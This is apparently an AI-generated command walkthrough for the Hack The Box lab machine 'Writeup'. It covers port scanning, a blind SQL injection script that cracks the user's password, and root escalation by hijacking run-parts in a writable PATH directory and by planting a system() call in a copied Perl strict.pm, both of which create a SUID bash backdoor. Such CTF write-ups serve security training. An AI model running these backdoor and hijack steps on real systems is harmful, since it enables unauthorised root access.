Here's a **Markdown-formatted command reference** for the HTB machine **Writeup**, structured by phase with explanatory notes and clean formatting:

---

# 🧭 HTB: Writeup – Command Walkthrough

## 📌 Box Info
- **IP**: `10.10.10.138`
- **OS**: Linux (Debian-based)
- **Difficulty**: Easy
- **Initial Access**: Blind SQLi in CMS Made Simple
- **Privilege Escalation**: PATH hijack via `run-parts`
- **Extras**: Perl module hijack (Beyond Root)

---

## 🔎 Recon

### 🔍 Full TCP Port Scan
```bash
nmap -p- --min-rate 10000 -oA scans/nmap_alltcp 10.10.10.138
```

### 🔍 Targeted Service & Script Scan
```bash
nmap -p 22,80 -sV -sC -oA scans/nmap_scripts 10.10.10.138
```

### 📄 robots.txt Discovery
```bash
curl http://10.10.10.138/robots.txt
```

---

## 🐚 Shell as jkr

### 💉 SQL Injection Exploit (Blind SQLi)
```bash
./cmsms_sqli.py -u http://10.10.10.138/writeup --crack --wordlist /usr/share/wordlists/rockyou.txt
```

### 🔑 Output Credentials
```
Username: jkr
Password: raykayjay9
```

### 🔐 SSH Login
```bash
ssh jkr@10.10.10.138
```

---

## 🔼 Privilege Escalation (jkr → root)

### 👥 Check Groups
```bash
id
```

### 📂 Writable Directories
```bash
ls -ld /usr/local/bin/ /usr/local/sbin/
```

### 🔍 Watch Processes with pspy
*(Upload and run `pspy`)*
```bash
./pspy64
```

### 🪤 Hijack `run-parts` in PATH
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /bin/0xdf\nchmod u+s /bin/0xdf' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
```

### 🔁 Reconnect to Trigger Payload
```bash
ssh jkr@10.10.10.138
```

### 🔓 Run Backdoored Bash
```bash
/bin/0xdf -p
```

---

## 🧠 Beyond Root – Perl Module Hijack

### 📂 Check Default Perl Modules
```bash
perl -MData::Dumper -e 'print Dumper \%INC'
```

### 📍 Print Perl Include Path
```bash
perl -e 'print join(":",@INC)'
```

### 📁 Create Writable Perl Include Directory
```bash
mkdir -p /usr/local/lib/x86_64-linux-gnu/perl/5.24.1
```

### 📄 Copy and Modify `strict.pm`
```bash
cp /usr/share/perl/5.24/strict.pm /usr/local/lib/x86_64-linux-gnu/perl/5.24.1/
```

Edit `/usr/local/lib/x86_64-linux-gnu/perl/5.24.1/strict.pm` and insert:
```perl
system "cp /bin/bash /bin/0xdf; chmod u+s /bin/0xdf";
```

### 🧪 Trigger Again via SSH
```bash
ssh jkr@10.10.10.138
/bin/0xdf -p
```

---

Let me know if you'd like this turned into a downloadable Markdown file or auto-saved into a HTB write-up template!